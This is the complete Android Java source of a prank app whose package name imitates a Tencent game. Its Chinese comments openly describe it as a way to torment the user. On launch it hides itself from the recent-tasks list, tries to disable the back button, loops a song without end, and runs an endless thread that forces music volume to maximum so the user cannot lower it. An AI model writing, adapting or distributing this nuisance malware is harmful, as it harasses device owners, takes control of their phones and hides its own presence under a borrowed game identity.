package com.tencent.tmgp.vs;

import android.app.*;
import android.content.*;
import android.media.*;
import android.os.*;

public class MainActivity extends Activity 
{
	private AudioManager mAudioManager;
	private MediaPlayer mediaPlayer;
	
    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        //不需要布局界面
		fuckUser();
    }

	@Override
	public void onBackPressed()
	{
//取消默认事件，使得返回键被禁用（然而没用）
	}
	//恶搞逻辑
	private void fuckUser(){
		//使程序转入后台，配合excludeFromRecents隐藏任务，让你找不到快速关闭方法
		moveTaskToBack(true);
		//获取音频管理器
		mAudioManager  = (AudioManager) getSystemService(AUDIO_SERVICE);
		//初始化播放音乐(喜之郎)
		mediaPlayer=MediaPlayer.create(this,R.raw.xzl);
		//设置无限循环
		mediaPlayer.setLooping(true);
		try
		{
		//开始播放
			mediaPlayer.start();
		}
		catch (Exception e)
		{
			//打印异常
			e.printStackTrace();
		}
//新线程，配合死循环使用，避免应用卡死
		new Thread(new Runnable(){

				@Override
				public void run()
				{
					//死循环
					while(true)
						mAudioManager.setStreamVolume(AudioManager.STREAM_MUSIC, mAudioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC), AudioManager.FLAG_PLAY_SOUND);
						//上面通过死循环设置音量最大
				}
			}).start();
			//运行线程
	}
}
